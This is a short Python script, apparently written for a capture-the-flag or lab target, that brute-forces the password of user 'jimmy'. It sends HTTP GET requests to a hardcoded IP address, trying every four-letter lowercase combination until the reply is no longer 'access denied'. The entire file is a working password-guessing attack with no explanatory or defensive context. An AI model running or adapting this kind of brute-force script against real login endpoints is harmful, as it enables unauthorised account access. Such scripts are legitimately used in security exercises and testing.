import requests


def alpha():
    for i in range(97, (97 + 26)):
        yield (chr(i))


chars = [alpha() for _ in range(4)]

def get_pwd():
    i = 0
    for chr4 in alpha():
        for chr3 in alpha():
            for chr2 in alpha():
                for chr1 in alpha():
                    wrd = chr4 + chr3 + chr2 + chr1
                    resp = requests.get(
                        f"http://34.121.35.187/locked?pass={wrd}&user=jimmy"
                    )
                    i += 1
                    print(f"{wrd}: {resp.text} ({i})")
                    if resp.text != "access denied":
                        return wrd


print(get_pwd())
